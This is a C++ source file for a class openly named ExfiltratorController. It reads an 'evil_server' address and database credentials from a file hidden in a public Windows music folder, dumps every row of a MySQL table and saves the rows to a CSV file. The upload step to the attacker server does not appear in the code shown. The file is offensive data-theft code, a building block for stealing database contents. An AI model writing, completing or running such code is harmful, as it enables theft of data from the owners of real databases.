#include <iostream>
#include <string>
#include <vector>
#include <mysql.h>
#include <fstream>

using namespace std;

class ExfiltratorController {
private:
    string path;
    string server;
    string user;
    string password;
    string evil_server;

public:
    ExfiltratorController() {
        this->path = "C:\\Users\\Public\\Music\\sv.txt";
        this->evil_server = "";
        readDataFromFile();
    }

    string getPath() const {
        return path;
    }

    string getServer() const {
        return server;
    }

    string getUser() const {
        return user;
    }

    string getPassword() const {
        return password;
    }

    string getEvilServer() const {
        return evil_server;
    }

    std::vector<std::vector<std::string>> createBackup() {
        MYSQL* conn;
        MYSQL_RES* res;
        MYSQL_ROW row;

        conn = mysql_init(nullptr);

        if (!mysql_real_connect(conn, server.c_str(), user.c_str(), password.c_str(), "pg", 0, nullptr, 0)) {
            return std::vector<std::vector<std::string>>();
        }
        if (mysql_query(conn, "SELECT * FROM schema_index")) {
            std::cerr << "Failed to execute query: " << mysql_error(conn) << std::endl;
            return std::vector<std::vector<std::string>>();
        }

        MYSQL_RES* result = mysql_store_result(conn);

        if (!result) {
            std::cerr << "Failed to get result set: " << mysql_error(conn) << std::endl;
            return std::vector<std::vector<std::string>>();
        }

        std::vector<std::vector<std::string>> table;

        int num_fields = mysql_num_fields(result);

        while ((row = mysql_fetch_row(result))) {
            std::vector<std::string> row_data;

            for (int i = 0; i < num_fields; i++) {
                row_data.push_back(row[i] ? row[i] : "NULL");
            }

            table.push_back(row_data);
        }
        mysql_free_result(result);
        mysql_close(conn);

        return table;
    }

    void saveTableToFile(const std::vector<std::vector<std::string>>& table, const std::string& fileName) {
        std::ofstream outputFile(fileName);

        if (!outputFile.is_open()) {
            std::cerr << "Failed to open output file" << std::endl;
            return;
        }

        for (const auto& row : table) {
            for (const auto& field : row) {
                outputFile << field << ",";
            }
            outputFile << std::endl;
        }

        outputFile.close();
    }

    void readDataFromFile() {
        std::ifstream inputFile(path);

        if (!inputFile.is_open()) {
            std::cerr << "Failed to open input file" << std::endl;
            return;
        }

        // Leer los datos del archivo y asignarlos a las variables privadas
        std::getline(inputFile, evil_server);
        std::getline(inputFile, user);
        std::getline(inputFile, password);
        std::getline(inputFile, server);

        inputFile.close();
    }


};
